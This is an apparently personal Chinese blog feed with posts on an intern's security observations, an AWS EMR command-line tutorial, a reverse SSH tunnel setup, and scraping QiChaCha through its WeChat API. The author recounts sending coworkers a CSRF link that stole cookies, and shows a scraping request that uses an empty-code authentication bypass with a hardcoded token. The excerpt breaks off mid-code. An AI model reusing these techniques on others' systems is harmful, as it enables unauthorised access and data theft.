    <content type="html"><![CDATA[<h4 id="题记：写在浅谈代码安全之前"><a href="#题记：写在浅谈代码安全之前" class="headerlink" title="题记：写在浅谈代码安全之前"></a>题记：写在浅谈代码安全之前</h4><p>业余看代码之前，对公司的一些产品进行了简单的安全测试。其实那些真正牛逼的人都是脾气好又低调的很啊，佩服佩服，努力学习，向你们看齐↖(^ω^)↗ 。别人送了一张FIT的票，好开心啊，谢谢Black_hole大表哥。现在终于理解别人去看演唱会的那种激动了，小菜鸟成长ING</p><h4 id="正文：浅谈代码安全以及其他"><a href="#正文：浅谈代码安全以及其他" class="headerlink" title="正文：浅谈代码安全以及其他"></a>正文：浅谈代码安全以及其他</h4><p>代码安全毋庸置疑是什么重要的，从安全角度来说，如果说除了安全问题。运维之外，那么首个应该负责的人就是主程。再假如一个主程没有丝毫的安全概念，那写出来的代码健壮性可想而知。这样下去，在我看来，10年8年的成长也不过仅仅是一些经验的积累，或许还有一些其他的东西，不过我是看不到了。</p><p>首先:</p><ol><li><p>意识很重要 x 1</p></li><li><p>安全知识很重要 x 2</p></li><li><p>代码规范很重要 x 3</p></li><li><p>架构设计和代码审查很重要 x4</p></li></ol><p>其次:</p><ul><li>不只是密码，不要CTO的重点是放在密码爆破，密码泄露上面，密码复杂度上。道理上讲是对的，但是也是不对的，要考虑全。</li></ul><ul><li>不仅要知道怎么发现还要知道怎么避免和怎么修复。</li></ul><p>没了,安全一旦出问题，结果显而易见。包括不限于，代码安全，运维安全，逻辑安全，产品安全，设计上的安全，以及依托于第三方工具的安全性。</p><ul><li><p>拿一个例子来说：本司有个前端，听说是跟着老板一起打天下的人。另，本人所在的公司没有一个人对安全有任何概念。运维混乱，没有架构，没有任何安全体系，然而我只是个爬虫实习生。。。。所以可想而知，当时我猜前端哥的代码肯定有漏洞，果不其然，CSRF，把一个构造好的链接用短网址处理下丢过去(因为有个上班的时候所有人都会开看板网页的，而且这个产品还是线上的，哭瞎在厕所)。立马把测试的文章删除了，同时cookie也到手了。报给CTO，CTO表示知道了，可能由于我表述不精，不会吹牛，看来这件事情没有引起太大的重视。同时API的接口设计根本没有做任何过滤，一开始timestap是需要在脚本里面构造好，后来直接给URL里面放上一个Date.now()传过去，竟然也行。也就是说API接口里面根本没有转义或者转成字符串。。。。</p></li><li><p>再拿一个例子说: 本司有个自然语言处理的大哥，开发者后台也是他们组写的。什么是懵逼，这就是懵逼，当时是让我体验产品呢，出于强迫症开始进行测试。我了草，推广链接居然把APPKEY都分享出去了。我了草，为什么，why?? </p></li><li><p>再拿一个例子说: 我在的这个组，为什么，为什么可以直接到发送对数据库的查询。为什么我Mongo本身数据不多，我还要交给ES查询，再从ES拿。</p></li><li><p>还有一个例子：是关于官网的，官网有个博客的连接，wordpress的，然而这个有xmlrpc的漏洞，报给他们说修复，修复竟然是从官网把链接去掉了，我去，好神奇啊，那看来我就没办法直接访问blog.xxx.xxx了吗？？？</p></li><li><p>我去，我突然又发现这个cookie好像没有有效时间的限制。</p></li></ul><h4 id="后记：写在浅谈代码安全之后"><a href="#后记：写在浅谈代码安全之后" class="headerlink" title="后记：写在浅谈代码安全之后"></a>后记：写在浅谈代码安全之后</h4><ol><li><p>能进这家公司，很大一部分的程度上是因为谈的来，还有我比较喜欢贤二，所以才有一种非常想来的感觉。之前友情提示了一下他们的安全体系十分的不安全，导致我轻松地就能接触到了他们所有的数据库，还有代码。当时其实是不报什么希望了，缘法自然，如是而已。然而因缘际会总是十分巧妙，最后还是来了。听说当时一面的爬虫工程师，对我不是很满意。</p></li><li><p>如果说你做了八九年，也不过就现在这个水平，你肯定有过人之处，但你有什么值得对我这个还没出道一年，还没毕业的人骄傲呢。问你问题你不愿意，那我还怎么接手你的代码，写的乱七八糟，连个文档都没有，又有什么值得了不起呢？ 讲信修睦，选贤与能，难否?</p></li><li><p>表示再也不会对任何人说，这个很简单很简单。我不关心什么什么，我只要他实现就行了。这是不负责任的表现。想起以前对实验室的学弟这样说，这个算法很简单，你只要加进去就行了。 (原来人会变得温柔，是透彻的懂了，哈哈)以后有人这样再对我这样说，我肯定是拒绝的。</p></li><li><p>没有什么是绝对安全的</p></li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;题记：写在浅谈代码安全之前&quot;&gt;&lt;a href=&quot;#题记：写在浅谈代码安全之前&quot; class=&quot;headerlink&quot; title=&quot;题记：写在浅谈代码安全之前&quot;&gt;&lt;/a&gt;题记：写在浅谈代码安全之前&lt;/h4&gt;&lt;p&gt;业余看代码之前，对公司的一些产品进行了简单的安全测试
      
    
    </summary>
    
      <category term="HowTo" scheme="http://iami.xyz/categories/HowTo/"/>
    
    
      <category term="实习笔记" scheme="http://iami.xyz/tags/%E5%AE%9E%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>AWS EC2 and AWS EMR and AWS RDS</title>
    <link href="http://iami.xyz/2016/12/12/How-to-AWS-EMR/"/>
    <id>http://iami.xyz/2016/12/12/How-to-AWS-EMR/</id>
    <published>2016-12-11T16:00:00.000Z</published>
    <updated>2018-01-12T02:06:41.705Z</updated>
    
    <content type="html"><![CDATA[<p>近些天来，一直使用AWS的相关产品，从最开始用EC2，后来到EMR，也遇到一些坑，整理下，作为记录。<br>最开始的aws配置就不讲了。 不会的话就 </p><ul><li><code>aws help</code></li><li><code>aws ec2 help</code></li><li><code>aws emr ls help</code></li></ul><p>首先下面这段代码终端里肯定是不能跑的，我只是为了好看，才这样放的。而且不一定要从终端的方式，<code>python</code>可以用<code>boto3</code>, 其他编程语言也提供了相应的SDK，可以操作。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line">$ aws emr create-cluster </span><br><span class="line">  --applications Name=Ganglia Name=Spark Name=Zeppelin </span><br><span class="line"> --ec2-attributes </span><br><span class="line"><span class="string">'&#123;</span></span><br><span class="line"><span class="string">"KeyName": "crawl-beijing",</span></span><br><span class="line"><span class="string">"InstanceProfile": "EMR_EC2_DefaultRole",</span></span><br><span class="line"><span class="string">"SubnetId": "subnet-61528516",</span></span><br><span class="line"><span class="string">"EmrManagedSlaveSecurityGroup":  "sg-ee6e828a",</span></span><br><span class="line"><span class="string">"EmrManagedMasterSecurityGroup": "sg-ed6e8289"</span></span><br><span class="line"><span class="string">&#125;'</span> </span><br><span class="line"> --service-role EMR_DefaultRole </span><br><span class="line"> --<span class="built_in">enable</span>-debugging </span><br><span class="line"> --release-label emr-5.2.0 </span><br><span class="line"> --<span class="built_in">log</span>-uri <span class="string">'s3n://aws-logs-243495284874-cn-north-1/elasticmapreduce/'</span> </span><br><span class="line"> --steps </span><br><span class="line"> <span class="string">'[</span></span><br><span class="line"><span class="string"> &#123;</span></span><br><span class="line"><span class="string">"Args": [</span></span><br><span class="line"><span class="string">"spark-submit", </span></span><br><span class="line"><span class="string">"--deploy-mode", "cluster", </span></span><br><span class="line"><span class="string">"--master", "yarn", </span></span><br><span class="line"><span class="string">"--conf", "spark.yarn.submit.waitAppCompletion=false", </span></span><br><span class="line"><span class="string">"--num-executors", "5", </span></span><br><span class="line"><span class="string">"--executor-cores", "5", </span></span><br><span class="line"><span class="string">"--executor-memory", "20g", "s3://zero2hadoop-jobs-mour/part1/wordcount.py", </span></span><br><span class="line"><span class="string">"s3://zero2hadoop-in-mour/part1/hello.txt", </span></span><br><span class="line"><span class="string">"s3://zero2hadoop-in-mour/part1/wordcount_spark.txt"</span></span><br><span class="line"><span class="string">],</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">"Type": "CUSTOM_JAR",</span></span><br><span class="line"><span class="string">"ActionOnFailure": "CONTINUE",</span></span><br><span class="line"><span class="string">"Jar": "command-runner.jar",</span></span><br><span class="line"><span class="string">"Properties": "",</span></span><br><span class="line"><span class="string">"Name": "SparkWordCountApp"</span></span><br><span class="line"><span class="string">&#125;,</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">"Args": [</span></span><br><span class="line"><span class="string">"spark-submit", "s3://zero2hadoop-jobs-mour/part1/wordcount.py", </span></span><br><span class="line"><span class="string">"s3://zero2hadoop-in-mour/part1/hello.txt", </span></span><br><span class="line"><span class="string">"s3://zero2hadoop-in-mour/part1/wordcount_spark.txt"</span></span><br><span class="line"><span class="string">],</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">"Type": "CUSTOM_JAR",</span></span><br><span class="line"><span class="string">"ActionOnFailure": "CONTINUE",</span></span><br><span class="line"><span class="string">"Jar": "command-runner.jar",</span></span><br><span class="line"><span class="string">"Properties": "",</span></span><br><span class="line"><span class="string">"Name": "SparkWordCountApp"</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">]'</span> </span><br><span class="line"> --name <span class="string">'My cluster'</span> </span><br><span class="line"> --instance-groups </span><br><span class="line"> <span class="string">'[</span></span><br><span class="line"><span class="string"> &#123;</span></span><br><span class="line"><span class="string">"InstanceCount": 1,</span></span><br><span class="line"><span class="string">"InstanceGroupType": "MASTER",</span></span><br><span class="line"><span class="string">"InstanceType": "m3.xlarge",</span></span><br><span class="line"><span class="string">"Name": "Master Instance Group"</span></span><br><span class="line"><span class="string">&#125;,</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">"InstanceCount": 1,</span></span><br><span class="line"><span class="string">"InstanceGroupType": "CORE",</span></span><br><span class="line"><span class="string">"InstanceType": "m3.xlarge",</span></span><br><span class="line"><span class="string">"Name": "Core Instance Group"</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">]'</span> </span><br><span class="line"></span><br><span class="line"> --configurations   <span class="string">'[</span></span><br><span class="line"><span class="string"> &#123;</span></span><br><span class="line"><span class="string"> "Classification":"spark",</span></span><br><span class="line"><span class="string"> "Properties":</span></span><br><span class="line"><span class="string"> &#123;"maximizeResourceAllocation":"true"&#125;,</span></span><br><span class="line"><span class="string"> "Configurations":[]</span></span><br><span class="line"><span class="string"> &#125;</span></span><br><span class="line"><span class="string"> ]'</span> </span><br><span class="line"></span><br><span class="line"> --region cn-north-1</span><br></pre></td></tr></table></figure><p>这基本是一份完整的配置，可以从命令行直接启动(去除里面的换行符)，现在只是为了有个全局观，然后来分析一下相关的知识。</p><p>最简单的我们可以看到，存储使用的是aws s3,那么ok,我们来看下s3的相关操作吧(当然一切的前提都是在你配置好<code>aws configure</code>之后,输入你的id, key,region之后)，配置好之后就可以操作ec2,emr所有的aws相关的产品。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">$ aws s3 mb s3://mybuckets <span class="comment">#create a s3 bucket</span></span><br><span class="line">$ aws s3 ls</span><br><span class="line">$ aws s3 cp --recursive /mylocal/path/ s3://s3uriname/yourdir  <span class="comment"># just use for directories</span></span><br><span class="line">$ aws s3 ls s3://mybucket<span class="comment"># also you can use ls --recursive</span></span><br></pre></td></tr></table></figure><p>ok，s3创建完毕，我们看看最简单的选项 <code>--applications Name=Ganglia Name=Spark Name=Zeppelin</code> 当然其实很明显了，就是你创建的EMR里面需要包括什么组件，直接写到Name里面就行了(前提是aws有的才行)。<br>下面接着分析选项；</p><ul><li><p><code>--service-role EMR_DefaultRole</code>  对应的Role有对应的安全组规则</p></li><li><p>EMR是在运行在EC2实例上的，所以可以看到下面对应的属性，需要设置EC2的相关信息。， 而<code>KeyName</code>则是代表了日后你ssh进去的时候后所需的pem文件名，例如我是crawl-beijing，那我就应该用<code>ssh -i ~/crawl-beijing.pem aws-ec2.publicip.com</code> ,当然<code>awscli</code>里面自带的也有ssh工具，<code>aws emr ssh --cluster-id j-3NJ4N3NZCMMT4 --key-pair-file ./crawl-beijing.pem</code>,cluster-id是通过<code>aws emr --listculsters</code>来查看的。</p></li></ul><blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">--ec2-attributes </span><br><span class="line">                            <span class="string">'&#123;</span></span><br><span class="line"><span class="string">                                "KeyName": "crawl-beijing",</span></span><br><span class="line"><span class="string">                                "InstanceProfile": "EMR_EC2_DefaultRole",</span></span><br><span class="line"><span class="string">                                "SubnetId": "subnet-61528516",</span></span><br><span class="line"><span class="string">                                "EmrManagedSlaveSecurityGroup":  "sg-ee6e828a",</span></span><br><span class="line"><span class="string">                                "EmrManagedMasterSecurityGroup": "sg-ed6e8289"</span></span><br><span class="line"><span class="string">                &#125;'</span></span><br></pre></td></tr></table></figure></blockquote><ul><li>–steps 里面是可以设置相应的操作步骤，步骤完成之后，自动终止EMR集群，不过要加 <code>--auto-terminate</code>选项，这样的话就会在执行完成之后终止集群，并将相应的数据保存到之前设定的S3数据桶中。而在step中的操作，则要涉及到对应程序的使用了，例如我用spark跑一个wordcount,如果是pig程序，那就是类似这样的</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">--steps Type=PIG,Name=<span class="string">"Pig Program"</span>,ActionOnFailure=CONTINUE,</span><br><span class="line">Args=[</span><br><span class="line">-f,s3://mybucket/scripts/pigscript.pig,</span><br><span class="line">-p,INPUT=s3://mybucket/inputdata/,</span><br><span class="line">-p,OUTPUT=s3://mybucket/outputdata/,</span><br><span class="line"><span class="variable">$INPUT</span>=s3://mybucket/inputdata/,</span><br><span class="line"><span class="variable">$OUTPUT</span>=s3://mybucket/outputdata/]</span><br></pre></td></tr></table></figure><p>如果我跑的是个python代码或者java代码，又有不同的方式，需要用<code>spark-submit</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">./bin/spark-submit \</span><br><span class="line">  --class &lt;main-class&gt; \</span><br><span class="line">  --master &lt;master-url&gt; \</span><br><span class="line">  --deploy-mode &lt;deploy-mode&gt; \</span><br><span class="line">  --conf &lt;key&gt;=&lt;value&gt; \</span><br><span class="line">  ... <span class="comment"># other options</span></span><br><span class="line">  &lt;application-jar&gt; \</span><br><span class="line">  [application-arguments]</span><br></pre></td></tr></table></figure><p>来提交，不过无论是哪种程序，都要顾及到代码本身的选项输入输出，然后写在<code>spark-submit</code>中，就像之前的这种</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">            <span class="string">"Args"</span>: [</span><br><span class="line">                            <span class="string">"spark-submit"</span>, </span><br><span class="line">                            <span class="string">"--deploy-mode"</span>, <span class="string">"cluster"</span>, </span><br><span class="line">                            <span class="string">"--master"</span>, <span class="string">"yarn"</span>, </span><br><span class="line">                            <span class="string">"--conf"</span>, <span class="string">"spark.yarn.submit.waitAppCompletion=false"</span>, </span><br><span class="line">                            <span class="string">"--num-executors"</span>, <span class="string">"5"</span>, </span><br><span class="line">                            <span class="string">"--executor-cores"</span>, <span class="string">"5"</span>, </span><br><span class="line">                            <span class="string">"--executor-memory"</span>, <span class="string">"20g"</span>, <span class="string">"s3://zero2hadoop-jobs-mour/part1/wordcount.py"</span>, </span><br><span class="line">                                                        </span><br><span class="line">                                                        <span class="string">"s3://zero2hadoop-in-mour/part1/wordcount_spark.txt"</span></span><br><span class="line">                            ],</span><br><span class="line"></span><br><span class="line">                                <span class="string">"Type"</span>: <span class="string">"CUSTOM_JAR"</span>,</span><br><span class="line">                                <span class="string">"ActionOnFailure"</span>: <span class="string">"CONTINUE"</span>,</span><br><span class="line">                                <span class="string">"Jar"</span>: <span class="string">"command-runner.jar"</span>,</span><br><span class="line">                                <span class="string">"Properties"</span>: <span class="string">""</span>,</span><br><span class="line">                                <span class="string">"Name"</span>: <span class="string">"SparkWordCountApp"</span></span><br><span class="line">                            &#125;</span><br></pre></td></tr></table></figure><ul><li><code>--instance-groups</code> 很明显这是为了EMR做EC2初始化类型和数目的限定</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">[</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="string">"InstanceCount"</span>: 1,</span><br><span class="line">            <span class="string">"InstanceGroupType"</span>: <span class="string">"MASTER"</span>,</span><br><span class="line">            <span class="string">"InstanceType"</span>: <span class="string">"m3.xlarge"</span>,</span><br><span class="line">            <span class="string">"Name"</span>: <span class="string">"Master Instance Group"</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="string">"InstanceCount"</span>: 2,</span><br><span class="line">            <span class="string">"InstanceGroupType"</span>: <span class="string">"CORE"</span>,</span><br><span class="line">            <span class="string">"InstanceType"</span>: <span class="string">"m3.xlarge"</span>,</span><br><span class="line">            <span class="string">"Name"</span>: <span class="string">"Core Instance Group"</span></span><br><span class="line">        &#125;</span><br><span class="line">    ]</span><br></pre></td></tr></table></figure><p>让我们把他变得简单点，起码看着简单点。<br>我们可以把相应的配置参数放在文件中，然后通过<code>file://</code>来读取</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">$aws emr create-cluster </span><br><span class="line">  --applications Name=Ganglia Name=Spark Name=Zeppelin </span><br><span class="line"> --ec2-attributes file://ec2-attributes.json </span><br><span class="line"> --service-role EMR_DefaultRole </span><br><span class="line"> --<span class="built_in">enable</span>-debugging </span><br><span class="line"> --release-label emr-5.2.0 </span><br><span class="line"> --<span class="built_in">log</span>-uri <span class="string">'s3n://aws-logs-243495284874-cn-north-1/elasticmapreduce/'</span> </span><br><span class="line"> --steps file://spark-submit-step.json </span><br><span class="line"> --name <span class="string">'My cluster'</span> </span><br><span class="line"> --instance-groups file://spark-master-slave.json </span><br><span class="line"> --configurations   <span class="string">'[</span></span><br><span class="line"><span class="string"> &#123;</span></span><br><span class="line"><span class="string"> "Classification":"spark",</span></span><br><span class="line"><span class="string"> "Properties":</span></span><br><span class="line"><span class="string"> &#123;"maximizeResourceAllocation":"true"&#125;,</span></span><br><span class="line"><span class="string"> "Configurations":[]</span></span><br><span class="line"><span class="string"> &#125;</span></span><br><span class="line"><span class="string"> ]'</span> </span><br><span class="line"> --region cn-north-1</span><br></pre></td></tr></table></figure><p>Other:<br>基本上就是这样，详细了解的话。AWS EMR的文档要看。相关还有hadoop和spark相关。</p><ul><li>windows/mac 下有个s3 brower程序可以用</li><li>应该在本地做好实验，然后再放在aws上跑</li><li>多使用help命令，然后阅读文档的时候，有pdf格式的，多语言里面选择中文，即可。</li><li>启动之后是不能直接访问的，需要手动配置对应安全组的出入站协议，不开相应端口(选择相应的协议)的话是不能访问的，当初用EMR的时候就是这样的，惨痛的教训，根本连接不到主节点。 </li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;近些天来，一直使用AWS的相关产品，从最开始用EC2，后来到EMR，也遇到一些坑，整理下，作为记录。&lt;br&gt;最开始的aws配置就不讲了。 不会的话就 &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;aws help&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;aws ec2 hel
      
    
    </summary>
    
      <category term="学习数据挖掘的路上" scheme="http://iami.xyz/categories/%E5%AD%A6%E4%B9%A0%E6%95%B0%E6%8D%AE%E6%8C%96%E6%8E%98%E7%9A%84%E8%B7%AF%E4%B8%8A/"/>
    
    
      <category term="实习笔记" scheme="http://iami.xyz/tags/%E5%AE%9E%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>SSH 内网穿透</title>
    <link href="http://iami.xyz/2016/12/05/ssh-reverse-tunnle/"/>
    <id>http://iami.xyz/2016/12/05/ssh-reverse-tunnle/</id>
    <published>2016-12-04T16:00:00.000Z</published>
    <updated>2018-01-12T02:06:41.705Z</updated>
    
    <content type="html"><![CDATA[<p>买的vps配置不好，远不如实验室的服务器。So,拿我的vps做下端口转发，即可。</p><ul><li><p>step1: 建立target对server的免密登录 (操作在target上，即实验室的服务器上)</p></li><li><p>step2: 建立server对host的端口转发      (操作在target上，依旧是实验室的服务器上)</p></li><li><p>step3: 从host连接到转发的端口即可登录target</p></li></ul><p>盗图一张<br><img src="/images//reverese-ssh3.png" alt="原理图"></p><p>step2:</p><p><code>ssh -p 22 -qngfNTR 6766:127.0.0.1:22 userVPS@IP</code></p><p>或者</p><p><code>autossh -M 6777 -NR newport:127.0.0.1:22 -i ~/.ssh/id_rsa userVPS@IP -p vpssshport &gt;&gt; /var/log/ssh_nat.log 2&gt;&amp;1 &amp;</code></p><p>other:</p><ul><li>ssh周边之: <code>sshpass</code>,<code>autossh</code></li><li>我没有使用autossh配置文件</li></ul><p>Reference:</p><ul><li><a href="https://toic.org/blog/2009/reverse-ssh-port-forwarding/" target="_blank" rel="noopener">reverse-ssh-port-forwarding</a></li><li><a href="http://www.freeoa.net/osuport/netmanage/ssh-and-reverse-tunnel_1896.html" target="_blank" rel="noopener">ssh-and-reverse-tunnel</a></li><li><a href="https://www.zhukun.net/archives/8130" target="_blank" rel="noopener">使用SSH反向隧道进行内网穿透</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;买的vps配置不好，远不如实验室的服务器。So,拿我的vps做下端口转发，即可。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;step1: 建立target对server的免密登录 (操作在target上，即实验室的服务器上)&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;step2: 建立ser
      
    
    </summary>
    
      <category term="HowTo" scheme="http://iami.xyz/categories/HowTo/"/>
    
    
      <category term="小手段" scheme="http://iami.xyz/tags/%E5%B0%8F%E6%89%8B%E6%AE%B5/"/>
    
  </entry>
  
  <entry>
    <title>Crawl From QiChaCha</title>
    <link href="http://iami.xyz/2016/12/01/QiChaChaAnd-WeiXin/"/>
    <id>http://iami.xyz/2016/12/01/QiChaChaAnd-WeiXin/</id>
    <published>2016-11-30T16:00:00.000Z</published>
    <updated>2018-01-12T02:06:41.705Z</updated>
    
    <content type="html"><![CDATA[<h3 id="企查查相关"><a href="#企查查相关" class="headerlink" title="企查查相关"></a>企查查相关</h3><p>来这里的第一份小任务是获取自动登录企查查后的cookie,本来是打算</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">wget --save-cookies cookies.txt \</span><br><span class="line">     --keep-session-cookies \</span><br><span class="line">     --post-data <span class="string">'user=username&amp;password=password'</span> \</span><br><span class="line">     --delete-after \</span><br><span class="line">     http://server.com/auth.php</span><br></pre></td></tr></table></figure><p>但是企查查的三方登录根本行不通，那些账号都是异常的，还需要验证码。后来去抓企查查公众号的包，得到了想要的。走了一条新的获取数据方式的道路。</p><ul><li>step1 : get token</li><li>step2 : get company name, In teh same time , you can get the keyno</li><li>step3 : get company details</li></ul><p>其实这里面是有个漏洞的，就是正常情况下请求一次网页，会生成一个code,然后拿着这个code才能去请求查询服务。但是你把code置空也能获取token…..</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">var</span> request = <span class="built_in">require</span>(<span class="string">"request"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> options = &#123; <span class="attr">method</span>: <span class="string">'GET'</span>,</span><br><span class="line">  url: <span class="string">'http://wxapi.qichacha.com/wechat/v1/base/advancedSearch'</span>,</span><br><span class="line">  qs: </span><br><span class="line">   &#123; <span class="attr">cityCode</span>: <span class="string">''</span>,</span><br><span class="line">     industryCode: <span class="string">''</span>,</span><br><span class="line">     isSortAsc: <span class="string">''</span>,</span><br><span class="line">     pageIndex: <span class="string">'1'</span>,</span><br><span class="line">     pageSize: <span class="string">'200'</span>,</span><br><span class="line">     province: <span class="string">''</span>,</span><br><span class="line">     registCapiBegin: <span class="string">''</span>,</span><br><span class="line">     registCapiEnd: <span class="string">''</span>,</span><br><span class="line">     searchIndex: <span class="string">''</span>,</span><br><span class="line">     searchKey: <span class="string">'al'</span>,</span><br><span class="line">     sortField: <span class="string">''</span>,</span><br><span class="line">     startDateBegin: <span class="string">''</span>,</span><br><span class="line">     startDateEnd: <span class="string">''</span>,</span><br><span class="line">     subIndustryCode: <span class="string">''</span>,</span><br><span class="line">     token: <span class="string">'9ae78b92b16d04173d8caffbd7cf3c30'</span> &#125;,</span><br><span class="line">  headers: </span><br><span class="line">   &#123; <span class="string">'cache-control'</span>: <span class="string">'no-cache'</span>,</span><br><span class="line">     <span class="string">'x-requested-with'</span>: <span class="string">'com.tencent.mm'</span>,</span><br><span class="line">     <span class="string">'accept-language'</span>: <span class="string">'zh-CN,en-US;q=0.8'</span>,</span><br><span class="line">     <span class="string">'accept-encoding'</span>: <span class="string">'gzip, deflate'</span>,</span><br><span class="line">     referer: <span class="string">'http://mob.qichacha.com/weixin-app/?code=&amp;state=123'</span>,</span><br><span class="line">     <span class="string">'user-agent'</span>: <span class="string">'Mozilla/5.0 (Linux; Android 5.1; MX5 Build/LMY47I) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile MQQBrowser/6.8 TBS/036872 Safari/537.36 MicroMessenger/6.3.31.940 NetType/WIFI Language/zh_CN'</span>,</span><br><span class="line">     origin: <span class="string">'http://mob.qichacha.com'</span>,</span><br><span class="line">     accept: <span class="string">'application/json, text/plain, */*'</span>,</span><br><span class="line">     connection: <span class="string">'keep-alive'</span>,</span><br><span class="line">     host: <span class="string">'wxapi.qichacha.com'</span> &#125; 